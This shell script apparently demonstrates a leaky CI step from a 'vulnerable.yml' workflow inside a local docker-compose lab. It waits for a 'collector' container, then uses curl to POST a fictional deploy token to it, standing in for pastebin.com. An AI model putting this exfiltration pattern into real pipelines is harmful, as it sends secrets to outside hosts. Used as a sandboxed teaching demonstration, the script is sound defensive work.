#!/bin/sh
# Reproduces, word for word, the "Report build metrics" step from
# vulnerable.yml -- but pointed at "collector" (the other container in
# this docker-compose) instead of pastebin.com, so it never contacts a
# real host. DEPLOY_TOKEN is a fictional example value, not a real secret.

set -x

DEPLOY_TOKEN="ghp_prodDeployToken789"

# Wait for the collector to be ready
until curl -s -o /dev/null "http://collector:8080/"; do
  sleep 0.5
done

echo ""
echo "### Running vulnerable.yml's curl command literally (pointed at the local collector) ###"
curl -X POST http://collector:8080/api/api_post.php -d "token=$DEPLOY_TOKEN"

echo ""
echo "### The secret has reached the 'attacker's server' -- check the 'collector' service logs ###"
